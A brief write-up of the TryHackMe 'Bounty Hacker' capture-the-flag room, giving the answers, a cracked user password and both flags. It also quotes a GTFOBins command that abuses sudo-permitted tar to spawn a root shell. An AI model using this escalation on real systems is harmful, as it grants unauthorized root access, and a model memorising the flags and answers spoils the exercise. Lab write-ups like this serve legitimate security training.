undermouse, 31.10.2020
======================
[THM] Bounty Hacker
======================

```bash
export IP=10.10.133.27
```

#3 Who wrote the task list? 
## Answer
```
lin
```

#4 What service can you bruteforce with the text file found?
```
ssh
```

#5 User's password?
## Answer
```
RedDr4gonSynd1cat3
```

#6 user.txt
## Answer
```
THM{CR1M3_SyNd1C4T3}
```

#7 root.txt
Checked `sudo -l` and got `tar` allowed to run as superuser.

## From: https://gtfobins.github.io/gtfobins/tar/

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```bash
   sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

## Answer
```
THM{80UN7Y_h4cK3r}
```